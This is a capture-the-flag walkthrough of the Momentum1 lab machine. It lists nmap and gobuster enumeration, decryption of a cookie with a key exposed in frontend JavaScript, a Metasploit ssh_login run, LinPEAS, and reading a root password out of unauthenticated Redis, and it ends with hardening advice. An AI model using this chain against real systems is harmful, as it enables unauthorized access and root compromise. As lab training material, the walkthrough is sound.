#  Momentum1 CTF – Summary Walkthrough  

A full text-based breakdown of the Momentum1 vulnerable machine.  
This box highlights issues like weak frontend encryption, exposed cookies, and misconfigured Redis — all chained together to achieve root compromise.  

---

##  DISCOVERY  
- Ran nmap scan:  
  nmap -sV -A <ip>
  
Found open ports:
22 (SSH)
80 (HTTP – Web server)

##  ENUMERATION  
Ran gobuster on port 80:

gobuster dir -u http://<ip>/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,log,php,html,bak,zip

Discovered:

/css

/js

/manual

/img

Inside /js/main.js:

Comment revealed AES encryption method

Exposed decryption passphrase

Hidden URL that returned a cookie value

✅ Decrypted the cookie using the key → Recovered SSH credentials for user auxerre

##  FOOTHOLD  
Used Metasploit Framework with ssh_login module:

msfconsole

search ssh_login

use auxiliary/scanner/ssh/ssh_login

set RHOSTS <ip>

set USERNAME auxerre

set PASSWORD <decrypted-password>

run

✅ Access gained as limited user auxerre

##  Privilege Escalation (auxerre → root)
Step 1 — Enumeration with LinPEAS:

Uploaded linpeas.sh to /tmp

Gave execute permission: chmod +x linpeas.sh

./linpeas.sh

Enumerated Linpeas result: Found Redis service running on the target


Step 2 — Exploiting Redis

Enumerated Redis and retrieved stored root password:

redis-cli

KEYS *

GET rootpass


Switched to root using discovered credentials:

su root

✅ Gained full root access

##  Recommendations
System & Service Hardening
Disable unauthenticated Redis access

Bind Redis to localhost or enforce strong authentication

Source Code & Application Layer
Never leave encryption methods, keys, or credentials in frontend code

Sanitize and restrict access to cookies and sensitive tokens

👉 View the Medium post here: [https://medium.com/@basitolasubomibalogun/momentum1-ctf-full-technical-walkthrough-c770f8848665]
